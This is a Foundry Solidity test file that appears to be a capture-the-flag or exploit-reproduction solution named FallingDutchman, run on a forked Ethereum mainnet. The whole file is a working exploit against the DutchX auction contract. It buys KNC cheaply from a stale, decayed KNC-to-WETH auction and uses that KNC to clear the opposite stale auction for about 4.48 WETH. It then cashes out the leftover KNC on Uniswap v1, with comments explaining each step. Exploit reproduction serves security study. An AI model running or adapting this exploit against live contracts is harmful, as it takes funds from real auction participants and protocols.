// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import "../../src/Interfaces.sol";
import "./Interfaces.sol";
import "./Constants.sol";

contract FallingDutchman is Test {
    address user = vm.envAddress("USER_ADDRESS");

    function setUp() public {
        vm.createSelectFork(vm.envString("ETH_RPC_URL"), FORK_BLOCK);
        vm.deal(user, 0.1 ether);
    }

    function test_Solution() public {
        vm.startBroadcast(user);
        IDutchExchange dx = IDutchExchange(DUTCHX);
        uint256 idx = dx.getAuctionIndex(KNC, WETH_ADDR); // 1051, both directions share it

        // 1. Wrap our 0.1 ETH and deposit it into the DutchX.
        IWETH(WETH_ADDR).deposit{value: 0.1 ether}();
        IWETH(WETH_ADDR).approve(DUTCHX, type(uint256).max);
        dx.deposit(WETH_ADDR, 0.1 ether);

        // 2. The KNC -> WETH auction has been running ~23h, so its price has decayed to
        //    ~0.0000367 WETH per KNC (market is ~0.0016). Bid all our WETH into it.
        dx.postBuyOrder(KNC, WETH_ADDR, idx, 0.1 ether);
        // The auction is still running, so we can claim our KNC at the current price.
        dx.claimBuyerFunds(KNC, WETH_ADDR, user, idx);

        // 3. The opposite WETH -> KNC auction is equally stale: ~65 KNC buys all ~4.48 WETH.
        //    Our bid covers the whole outstanding volume, which clears that auction.
        dx.postBuyOrder(WETH_ADDR, KNC, idx, dx.balances(KNC, user));
        dx.claimBuyerFunds(WETH_ADDR, KNC, user, idx);

        // 4. Withdraw everything and unwrap the WETH.
        dx.withdraw(WETH_ADDR, type(uint256).max);
        uint256 kncLeft = dx.balances(KNC, user);
        dx.withdraw(KNC, kncLeft);
        IWETH(WETH_ADDR).withdraw(IERC20(WETH_ADDR).balanceOf(user));

        // 5. Sell the leftover KNC on Uniswap v1 for even more ETH.
        IERC20(KNC).approve(UNIV1_KNC, kncLeft);
        IUniswapV1Exchange(UNIV1_KNC).tokenToEthSwapInput(kncLeft, 1, block.timestamp);
        vm.stopBroadcast();
        checkSolve();
    }

    function checkSolve() public view {
        require(user.balance >= 4 ether, "not enough ETH");
        console.log("Solved. Ending balance in ETH: %18e", user.balance);
    }
}
